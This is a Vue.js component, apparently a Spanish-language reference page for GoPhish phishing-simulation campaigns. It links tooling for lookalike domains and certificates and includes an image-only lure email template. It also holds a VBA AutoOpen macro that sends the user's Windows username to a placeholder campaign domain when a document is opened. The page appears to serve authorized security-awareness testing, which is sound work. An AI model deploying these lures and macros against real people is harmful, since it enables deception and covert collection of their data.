<template>
  <v-container fluid>
    <v-card height="70" flat></v-card>
    <v-row>
      <v-col cols="12" sm="12" md="12" lg="6">
        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> GoPhish </v-card-title>

          <v-card-subtitle> Toolkit </v-card-subtitle>

          <v-card-actions>
            <v-btn color="orange lighten-2" text> Explore </v-btn>

            <v-spacer></v-spacer>

            <v-btn icon @click="showGo = !showGo">
              <v-icon>{{
                showGo ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showGo">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <a
                    href="https://github.com/gophish/gophish/releases/"
                    target="_blank"
                    >Release:</a
                  >
                  enlace de github
                </div>
                <div>
                  <a
                    href="https://docs.getgophish.com/user-guide/template-reference"
                    target="_blank"
                    >Reference:
                  </a>
                  variables para el template
                </div>
                <div>
                  <a
                    href="https://docs.getgophish.com/user-guide/documentation/landing-pages"
                    target="_blank"
                    >Landing Pages:
                  </a>
                  docs gophish
                </div>
                <div>
                  <a
                    href=" https://documentation.mailjet.com/hc/en-us/articles/360042751854-How-to-exclude-a-link-from-being-tracked-when-click-tracking-is-enabled-"
                    target="_blank"
                    >Tracker: </a
                  >mailjet
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>

      </v-col>
      <v-col cols="12" sm="12" md="12" lg="6">
        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> CERTBOT </v-card-title>

          <v-card-subtitle> Certificado para landing page </v-card-subtitle>

          <v-card-actions>
            <v-btn color="orange lighten-2" text> Explore </v-btn>

            <v-spacer></v-spacer>

            <v-btn icon @click="showCert = !showCert">
              <v-icon>{{
                showCert ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showCert">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <a
                    href="https://certbot.eff.org/lets-encrypt/"
                    target="_blank"
                    >Certbot instructions</a
                  >
                </div>
                <div>Generar certificado:</div>
                <div>
                  certbot certonly --manual --preferred-challenges=dns --email (
                  EMAIL) --server https://acme-v02.api.letsencrypt.org/directory
                  --agree-tos -d *.(DOMAIN)
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>

      <v-col cols="12" sm="12" md="12" lg="6">
        

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Varios </v-card-title>

          <v-card-subtitle> Herramientas </v-card-subtitle>

          <v-card-actions>
            <v-btn color="orange lighten-2" text> Explore </v-btn>

            <v-spacer></v-spacer>

            <v-btn icon @click="showTools = !showTools">
              <v-icon>{{
                showTools ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showTools">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <a
                    href="https://github.com/urbanadventurer/urlcrazy"
                    target="_blank"
                    >Urlcrazy:
                  </a>
                  Permutación de dominios
                </div>
                <div>
                  <a href="https://www.base64-image.de/" target="_blank"
                    >Imagen64: </a
                  >Generar la imagen en base 64
                </div>
                <div>
                  <a href="https://tmuxcheatsheet.com/" target="_blank"
                    >Tmux: </a
                  >Cheat sheet tmux
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>
      <v-col cols="12" sm="12" md="12" lg="6">
        

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Imagen en cuerpo </v-card-title>

          <v-card-subtitle>
            Codigo del email con imagen como cuerpo
          </v-card-subtitle>

          <v-card-actions>
            <v-btn color="orange lighten-2" text> Explore </v-btn>

            <v-spacer></v-spacer>

            <v-btn icon @click="showCode = !showCode">
              <v-icon>{{
                showCode ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showCode">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <div><span>&lt;html&gt;</span></div>
                  <div><span>&lt;body&gt;</span></div>
                  <div>
                    <span
                      >&lt;a href=&quot;{ {.URL}}&quot; rel="notrack"&gt;</span
                    >
                  </div>
                  <div><span>&lt;img src="[BASE64]" /&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div>
                    <span>
                      &lt;p&gt; &lt;img src="{ {.TrackingURL}}"
                      rel="notrack"/&gt; &lt;/p&gt;</span
                    >
                  </div>
                  <div><span>&lt;/body&gt;</span></div>
                  <div><span>&lt;/html&gt;</span></div>
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>

      <v-col cols="12" sm="12" md="12" lg="6">       

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> File attached </v-card-title>

          <v-card-subtitle> Phishing con archivo adjunto </v-card-subtitle>

          <v-card-actions>
            <v-btn color="orange lighten-2" text> Explore </v-btn>

            <v-spacer></v-spacer>

            <v-btn icon @click="showAdj = !showAdj">
              <v-icon>{{
                showAdj ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showAdj">
              <v-divider></v-divider>

              <v-card-text>
                <div> 
                  <b>Introducción:</b>                
                  <div>Para realizar el tracking de un archivo, la macro se encarga de realizar una petición GET al dominio de la campaña cuando el usuario abre el archivo. En algunos casos el usuario deberá habilitar las macros para que la petición se realice en otros se ejecutara automaticamente, todo depende de la configuración que tenga el usuario para su ejecucción.</div>
                  <br>
                  <b>Ejecucción:</b>  
                  <div>Para realizarla se deben lanzar 2 campañas donde la primera cuenta con unico usuario (cuenta propia). De esta se obtendrá el Rid (cvs: raw events), este Rid se utiliza para realizar el tracking. La segunda campaña corresponde a la campaña que se realiza con el cliente</div>
                  <div>Una vez se ejecuta la macro, para visualizar las peticiones, se accede a el cvs de raw events (campaña 1) donde cada GET tendrá la <b>dirección ip</b> y el <b>username</b> de la maquina donde se ejecutó el archivo. Con estos datos se realiza un cruce con la información de la campaña 2 (cliente) para identificar que usuarios ejecutaron la macro. </div>
                  <br>
                  <b>Parametros:</b> 
                  <div>La macro cuenta con 2 parametros</div>
                  <div><b>DOMAIN:</b>Dominio de la campaña</div>
                  <div><b>RID:</b>Rid de la primer campaña con unico usuario</div>
                  <div></div>
                  <br>
                   <b                   
                    >Codigo vba:
                  </b>
                  <br>
                  
                    <div>Sub AutoOpen()</div>
                      
                     <div> &nbsp; Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")</div>
                      <div>&nbsp; UserNameId = Environ("USERNAME")</div>
                      <div><span>&nbsp; URL = "http://[DOMAIN]/?rid=[RID]&amp;username" &amp; UserNameId</span> </div>
                      <div>&nbsp; objHTTP.Open "GET", URL, False</div>
                      <div>&nbsp; objHTTP.send ("")</div>

                    <div>End Sub</div>
                  
                </div>
                <br>
                <b>Nota:</b> 
                <div>La función debe llamar AutoOpen para que se ejecute automaticamente una vez se abra el archivo. El archivo puede ser guardado en formato .docm o .doc</div>
                <br>
                  <b>Referencias:</b> 
                <div>
                  <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/environ-function" target="_blank"
                    >Environ function: </a
                  >Documentación sobre función environ 
                </div>
                <div>
                  <a href="https://gist.github.com/RebeccaWhit3/5dad8627b8227142e1bea432db3f8824" target="_blank"
                    >Environment Variables in Windows: </a
                  >Lista de variables de entorno en windows
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>
    </v-row>
  </v-container>
</template>

<script>
export default {
  data() {
    return {
      showGo: false,
      showCert: false,
      showTools: false,
      showCode: false,
      showAdj: false,
    };
  },
};
</script>